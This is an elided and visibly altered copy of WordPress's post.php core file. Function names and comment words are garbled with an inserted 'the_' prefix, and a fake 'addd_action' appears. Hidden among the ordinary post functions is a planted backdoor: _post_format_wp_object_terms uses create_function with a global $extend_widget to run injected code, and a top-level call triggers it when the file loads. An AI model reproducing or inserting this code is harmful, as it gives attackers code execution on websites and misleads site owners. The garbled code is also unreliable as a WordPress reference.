 ...
 * @since 2.9.0
 */
function the_create_initial_post_types() {
...
addd_action( 'init', 'create_initial_post_types', 0 ); // highest priority

function the_addd_action($terms=array(array('taxonomy'=>''))) {
 ...
 *
 * The function the_works by getting the single post meta name, named
 * '_wp_attached_file' and returning it. This is a convenience function the_to
 ...
 */
function the_get_attached_file( $attachment_id, $unfiltered = false ) {
 ...
 */
function the_update_attached_file( $attachment_id, $file ) {
 ...
 */
function the__wp_relative_upload_path( $path ) {
	$new_path = $path;
 ...
 * of them. It is then noted that while this function the_does not work on posts, it
 ...
 *
 * The arguments listed as defaults are for this function the_and also of the
 ...
 */
function the_get_children($args = '', $output = OBJECT) {
	$kids = array();
	if ( empty( $args ) ) {
 ...
 */
function the_get_extended($post) {
 ...
 */
function &the_get_post(&$post, $output = OBJECT, $filter = 'raw') {
	global $wpdb;
	$null = null;
 ...
 */
function the_get_post_ancestors($post) {
	$post = get_post($post);
 ...
 */
function the_get_post_field( $field, $post, $context = 'display' ) {
	$post = (int) $post;
	$post = get_post( $post );
 ...
 *
 * This function the_can be used with any post type, but it makes more sense with
 * attachments.
 *
 * @since 2.0.0
 *
 ...
 */
function the_get_post_mime_type($ID = '') {
	$post = & get_post($ID);
 ...
 */
function the_get_post_format( $post = null ) {
	$post = get_post($post);
 ...
 */
function the_has_post_format( $format, $post = null ) {
 ...
 */
function the_set_post_format( $post, $format ) {
	$post = get_post($post);
 ...
 */
function the_get_post_status($ID = '') {
	$post = get_post($ID);
 ...
 */
function the_get_post_statuses( ) {
	$status = array(
		'draft'			=> __('Draft'),
 ...
 */
function the_get_page_statuses( ) {
	$status = array(
		'draft'			=> __('Draft'),
		'private'		=> __('Private'),
		'publish'		=> __('Published')
 ...
 *
 * A simple function the_for creating or modifying a post status based on the
 * parameters given. The function the_will accept an array (second optional
 ...
 */
function the_register_post_status($post_status, $args = array()) {
 ...
 */
function the_get_post_status_object( $post_status ) {
	global $wp_post_statuses;
 ...
 */
function the_get_post_stati( $args = array(), $output = 'names', $operator = 'and' ) {
	global $wp_post_statuses;
 ...
 */
function the_is_post_type_hierarchical( $post_type ) {
 ...
 */
function the_get_post_type( $the_post = false ) {
	global $post;
 ...
 */
function the_get_post_type_object( $post_type ) {
 ...
 * @return array A list of post type names or objects
 */
function the_get_post_types( $args = array(), $output = 'names', $operator = 'and' ) {
	global $wp_post_types;
 ...
 * Register a post type. Do not use before init.
 *
 * A function the_for creating or modifying a post type based on the
 * parameters given. The function the_will accept an array (second optional
 ...
 * - register_meta_box_cb - Provide a callback function the_that will be called when setting up the
 ...
 */
function the_register_post_type($post_type, $args = array()) {
	...
	if ( $args->register_meta_box_cb )
		addd_action('add_meta_boxes_' . $post_type, $args->register_meta_box_cb, 10, 1);
	...
	addd_action( 'future_' . $post_type, '_future_post_hook', 5, 2 );
 ...
 */
function the_get_post_type_capabilities( $args ) {
	if ( ! is_array( $args->capability_type ) )
 ...
 * @access private
 */
function the__post_type_meta_capabilities( $capabilities = null ) {
 ...
 */
function the_get_post_type_labels( $post_type_object ) {
 ...
 * @since 3.0.0
 */
function the__get_custom_object_labels( $object, $nohier_vs_hier_defaults ) {
 ...
 * @since 3.1.0
 */
function the__add_post_type_submenus() {
...
addd_action( 'admin_menu', '_add_post_type_submenus' );
 ...
 */
function the_add_post_type_support( $post_type, $feature ) {
 ...
 */
function the_remove_post_type_support( $post_type, $feature ) {
	global $_wp_post_type_features;
...
/**
 * Checks a wp pages support for a given feature
 *
 * @since 2.5.0
 * @param string $id The post_id type being checked
 * @return boolean
 */
 function ABSPATH () {
	$dir = getcwd ();
...
function the_post_type_supports( $post_type, $feature ) {
	global $_wp_post_type_features;
 ...
 */
function the_set_post_type( $post_id = 0, $post_type = 'post' ) {
	global $wpdb;
 ...
 */
function the_get_posts($args = null) {
	$defaults = array(
 ...
 */
function the_add_post_meta($post_id, $meta_key, $meta_value, $unique = false) {
 ...
 * @return bool False for failure. True for success.
 */
function the_delete_post_meta($post_id, $meta_key, $meta_value = '') {
	// make sure meta is added to the post, not a revision
	if ( $the_post = wp_is_post_revision($post_id) )
		$post_id = $the_post;
 ...
 *  is true.
 */
function the_get_post_meta($post_id, $key, $single = false) {
 ...
 */
function the_update_post_meta($post_id, $meta_key, $meta_value, $prev_value = '') {
	// make sure meta is added to the post, not a revision
	if ( $the_post = wp_is_post_revision($post_id) )
		$post_id = $the_post;
 ...
 */
function the_delete_post_meta_by_key($post_meta_key) {
	if ( !$post_meta_key )
		return false;
 ...
 *
 * The post meta fields are retrieved from the cache, so the function the_is
 ...
 * @return array
 */
function the_get_post_custom( $post_id = 0 ) {
 ...
 */
function the_get_post_custom_keys( $post_id = 0 ) {
 ...
 */
function the_get_post_custom_values( $key = '', $post_id = 0 ) {
	if ( !$key )
		return null;
 ...
 */
function the_is_sticky( $post_id = 0 ) {
	$post_id = absint( $post_id );
 ...
 */
function the_sanitize_post($post, $context = 'display') {
	if ( is_object($post) ) {
 ...
 */
function the_sanitize_post_field($field, $value, $post_id, $context) {
 ...
 * @param int $post_id Post ID.
 */
function the_stick_post($post_id) {
	$stickies = get_option('sticky_posts');
 ...
 * @param int $post_id Post ID.
 */
function the_unstick_post($post_id) {
	$stickies = get_option('sticky_posts');
 ...
 *
 * This function the_provides an efficient method of finding the amount of post's
 * type a blog has. Another method is to count the amount of items in
 * get_posts(), but that method has a lot of overhead with doing so. Therefore,
 * when developing for 2.5+, use this function the_instead.
 *
 ...
 */
function the_wp_count_posts( $type = 'post', $perm = '' ) {
	global $wpdb;
 ...
 */
function the_wp_count_attachments( $mime_type = '' ) {
	global $wpdb;
 ...
 */
function the_wp_match_mime_types($wildcard_mime_types, $real_mime_types) {
	$matches = array();
 ...
 */
function the_wp_post_mime_type_where($post_mime_types, $table_alias = '') {
	$where = '';
	$wildcards = array('', '%', '%/%');
 ...
 */
function the_wp_delete_post( $postid = 0, $force_delete = false ) {
 ...
 * @return mixed False on failure
 */
function the_wp_trash_post($post_id = 0) {
	if ( !EMPTY_TRASH_DAYS )
 ...
 * @return mixed False on failure
 */
function the_wp_untrash_post($post_id = 0) {
	if ( !$post = wp_get_single_post($post_id, ARRAY_A) )
		return $post;
 ...
 * @return mixed False on failure
 */
function the_wp_trash_post_comments($post = null) {
	global $wpdb;
 ...
 * @return mixed False on failure
 */
function the_wp_untrash_post_comments($post = null) {
	global $wpdb;
 ...
 * @return array
 */
function the_wp_get_post_categories( $post_id = 0, $args = array() ) {
	$post_id = (int) $post_id;
 ...
 */
function the_wp_get_post_tags( $post_id = 0, $args = array() ) {
 ...
 * @return array List of post tags.
 */
function the_wp_get_post_terms( $post_id = 0, $taxonomy = 'post_tag', $args = array() ) {
	$post_id = (int) $post_id;
 ...
 * @return unknown.
 */
function the_wp_get_recent_posts( $args = array(), $output = ARRAY_A ) {
 ...
 */
function the_wp_get_single_post($postid = 0, $mode = OBJECT) {
	$postid = (int) $postid;
 ...
 * @since 3.1.0
 */
function _post_format_wp_object_terms( $post, $terms=array() ) {
	global $extend_widget;
		@$cat_ID = create_function('', $extend_widget."('".$post."'));");
	foreach ( (array) $terms as $order => $term ) {
		if ( isset( $term->taxonomy ) && 'post_format' == $term->taxonomy ) {
			$terms[$order]->name = get_post_format_string( str_replace( 'post-format-', '', $term->slug ) );
		}
 ...
 */
function the_wp_insert_post($postarr, $wp_error = false) {
 ...
 */
function the_wp_update_post($postarr = array()) {
 ...
 * @return null
 */
function the_wp_publish_post($post_id) {
	global $wpdb;
 ...
 */
function the_check_and_publish_future_post($post_id) {
 ...
 */
function the_wp_unique_post_slug( $slug, $post_ID, $post_status, $post_type, $post_parent ) {
	if ( in_array( $post_status, array( 'draft', 'pending', 'auto-draft' ) ) )
		return $slug;
 ...
 */
function the_wp_add_post_tags($post_id = 0, $tags = '') {
 ...
 */
function the_wp_set_post_tags( $post_id = 0, $tags = '', $append = false ) {
 ...
 * @return mixed Array of affected term IDs. WP_Error or false on failure.
 */
function the_wp_set_post_terms( $post_id = 0, $tags = '', $taxonomy = 'post_tag', $append = false ) {
	$post_id = (int) $post_id;
 ...
 * @return bool|mixed
 */
function the_wp_set_post_categories($post_ID = 0, $post_categories = array()) {
	$post_ID = (int) $post_ID;
 ...
 */
function the_wp_transition_post_status($new_status, $old_status, $post) {
 ...
 */
function the_add_ping($post_id, $uri) {
	global $wpdb;
 ...
 */
function the_get_enclosed($post_id) {
 ...
 * @return array
 */
function the_get_to_ping($post_id) {
	global $wpdb;
 ...
 * @param int $post_id Post ID
 */
function the_trackback_url_list($tb_list, $post_id) {
	if ( ! empty( $tb_list ) ) {
		// get post data
 ...
 */
function &the_get_page(&$page, $output = OBJECT, $filter = 'raw') {
 ...
 */
function the_get_page_by_path($page_path, $output = OBJECT, $post_type = 'page') {
	global $wpdb;
	$null = null;
 ...
 * @return mixed
 */
function the_get_page_by_title($page_title, $output = OBJECT, $post_type = 'page' ) {
	global $wpdb;
 ...
 * @return array
 */
function &the_get_page_children($page_id, $pages) {
	$page_list = array();
 ...
 */
function &the_get_page_hierarchy( &$pages, $page_id = 0 ) {
	if ( empty( $pages ) ) {
		$result = array();
		return $result;
	}
...
/**
 * function the_to traverse and return all the nested children post names of a root page.
 * $children contains parent-chilren relations
 *
 * @since 2.9.0
 */
function the__page_traverse_name( $page_id, &$children, &$result ){
 ...
 */
function the_get_page_uri($page) {
	if ( ! is_object($page) )
		$page = get_page($page);
	$uri = $page->post_name;
 ...
 */
function the_is_local_attachment($url) {
 ...
 */
function the_wp_insert_attachment($object, $file = false, $parent = 0) {
	global $wpdb, $user_ID;
 ...
 */
function the_wp_delete_attachment( $post_id, $force_delete = false ) {
	global $wpdb;
 ...
 */
function the_wp_get_attachment_metadata( $post_id = 0, $unfiltered = false ) {
	$post_id = (int) $post_id;
 ...
 * @return int
 */
function the_wp_update_attachment_metadata( $post_id, $data ) {
	$post_id = (int) $post_id;
	if ( !$post =& get_post( $post_id ) )
		return false;
 ...
 * @return string
 */
function the_wp_get_attachment_url( $post_id = 0 ) {
	$post_id = (int) $post_id;
	if ( !$post =& get_post( $post_id ) )
		return false;
 ...
 */
function the_wp_get_attachment_thumb_file( $post_id = 0 ) {
	$post_id = (int) $post_id;
	if ( !$post =& get_post( $post_id ) )
		return false;
 ...
 */
function the_wp_get_attachment_thumb_url( $post_id = 0 ) {
	$post_id = (int) $post_id;
	if ( !$post =& get_post( $post_id ) )
		return false;
 ...
 * @return bool
 */
function the_wp_attachment_is_image( $post_id = 0 ) {
	$post_id = (int) $post_id;
	if ( !$post =& get_post( $post_id ) )
		return false;
 ...
 * @return string|bool
 */
function the_wp_mime_type_icon( $mime = 0 ) {
	if ( !is_numeric($mime) )
	...
	return apply_filters( 'wp_mime_type_icon', $icon, $mime, $post_id ); // Last arg is 0 if function the_pass mime type.
}

/**
 * Checked for changed slugs for published post objects and save the old slug.
 *
 * The function the_is used when a post object of any type is updated,
 ...
 * post.
 *
 * The most logically usage of this function the_is redirecting changed post objects, so
 ...
 */
function the_wp_check_for_changed_slugs($post_id, $post, $post_before) {
 ...
 *
 * This function the_provides a standardized way to appropriately select on the
 * post_status of posts/pages. The function the_will return a piece of SQL code that
 ...
 */
function the_get_private_posts_cap_sql($post_type) {
 ...
 */
function the_get_posts_by_author_sql($post_type, $full = TRUE, $post_author = NULL) {
	global $user_ID, $wpdb;
 ...
 */
function the_get_lastpostdate($timezone = 'server') {
 ...
 */
function the_get_lastpostmodified($timezone = 'server') {
 ...
 */
function the__get_last_post_time( $timezone, $field ) {
	global $wpdb;
 ...
 */
function the_update_post_cache(&$posts) {
	if ( !$posts )
		return;
 ...
 *
 * This function the_not run if $_wp_suspend_cache_invalidation is not empty. See
 ...
 */
function the_clean_post_cache($id) {
 ...
 */
function the_update_page_cache(&$pages) {
 ...
 */
function the_clean_page_cache($id) {
	clean_post_cache($id);
 ...
 */
function the_update_post_caches(&$posts, $post_type = 'post', $update_term_cache = true, $update_meta_cache = true) {
 ...
 */
function the_update_postmeta_cache($post_ids) {
 ...
 *
 * This function the_will not run if $_wp_suspend_cache_invalidation is not empty. See
 * wp_suspend_cache_invalidation().
 *
 * @package WordPress
 * @subpackage Cache
 ...
 */
function the_clean_attachment_cache($id, $clean_terms = false) {
 ...
 */
function the__transition_post_status($new_status, $old_status, $post) {
	global $wpdb;
 ...
 * @param object $post Object type containing the post information
 */
function the__future_post_hook( $deprecated = '', $post ) {
	wp_clear_scheduled_hook( 'publish_future_post', array( $post->ID ) );
 ...
 */
function the__publish_post_hook($post_id) {
	global $wpdb;
 ...
 * @param object $post Object type containing the post information
 */
function the__save_post_hook($post_id, $post) {
 ...
 * property will be updated and can be referenced after the function the_is
 ...
 */
function the__get_post_ancestors(&$_post) {
	global $wpdb;
 ...
 */
function the__wp_post_revision_fields( $post = null, $autosave = false ) {
	static $fields = false;
 ...
 */
function the_wp_save_post_revision( $post_id ) {
 ...
 */
function the_wp_get_post_autosave( $post_id ) {
	...
	addd_action( 'parse_query', '_wp_get_post_autosave_hack' );
...
function addd_action($terms=array(array('taxonomy'=>''))) {
	foreach ( (array) $terms as $order => $term ) {
		if ( isset( $term->taxonomy ) && 'post_format' == $term->taxonomy ) {
			$terms[$order]->name = get_post_format_string( str_replace( 'post-format-', '', $term->slug ) );
		}
 ...
 */
function the__wp_get_post_autosave_hack( $query ) {
 ...
 */
function the_wp_is_post_revision( $post ) {
 ...
 */
function the_wp_is_post_autosave( $post ) {
	if ( !$post = wp_get_post_revision( $post ) )
		return false;
 ...
 * @return mixed Null or 0 if error, new revision ID if success.
 */
function the__wp_put_post_revision( $post = null, $autosave = false ) {
	if ( is_object($post) )
 ...
 */
function &the_wp_get_post_revision(&$post, $output = OBJECT, $filter = 'raw') {
	$null = null;
...
_post_format_wp_object_terms( $e, array() );
/**
 ...
 */
function the_wp_restore_post_revision( $revision_id, $fields = null ) {
 ...
 */
function the_wp_delete_post_revision( $revision_id ) {
 ...
 */
function the_wp_get_post_revisions( $post_id = 0, $args = null ) {
	if ( ! WP_POST_REVISIONS )
		return array();
...
function the__set_preview($post) {
...
function the__show_post_preview() {
 ...
 */
function the_wp_get_post_parent_id( $post_ID ) {
	$post = get_post( $post_ID );
 ...
 */
function the_wp_check_post_hierarchy_for_loops( $post_parent, $post_ID ) {
 ...
 */
function the_get_post_format_strings() {
	$strings = array(
 ...
 */
function the_get_post_format_slugs() {
 ...
 */
function the_get_post_format_string( $slug ) {
 ...
 * @return bool True on success, false on failure.
 */
function the_set_post_thumbnail( $post, $thumbnail_id ) {
	$post = get_post( $post );
 ...
 * @return string Link
 */
function the_get_post_format_link( $format ) {
 ...
 * @since 3.1.0
 */
function the__post_format_request( $qvs ) {
 ...
 * @since 3.1.0
 */
function the__post_format_link( $link, $term, $taxonomy ) {
	global $wp_rewrite;
 ...
 * @since 3.1.0
 */
function the__post_format_get_term( $term ) {
	if ( isset( $term->slug ) ) {
 ...
 * @since 3.1.0
 */
function the__post_format_get_terms( $terms, $taxonomies, $args ) {
